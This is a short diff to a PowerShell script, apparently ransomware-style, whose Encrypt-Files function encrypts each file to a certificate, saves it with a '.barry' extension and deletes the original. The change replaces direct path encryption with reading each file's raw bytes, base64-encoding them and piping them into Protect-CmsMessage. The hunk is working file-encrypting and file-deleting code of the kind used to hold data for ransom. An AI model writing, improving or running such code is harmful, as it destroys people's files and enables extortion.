@@ -49,7 +49,9 @@ function Encrypt-Files{
         Write-Host 'Encrypting $file'
         $path = $file.FullName
         $newfile = $path+'.barry'
-        Protect-CmsMessage -To $cert -Path $path -OutFile $newfile
+        $bytes = Get-Content -Path $path -Encoding Byte -Raw
+        $plaintext = [System.Convert]::ToBase64String($bytes)
+        $plaintext | Protect-CmsMessage -To $cert -OutFile $newfile
         Remove-Item -Path $path
         
     }
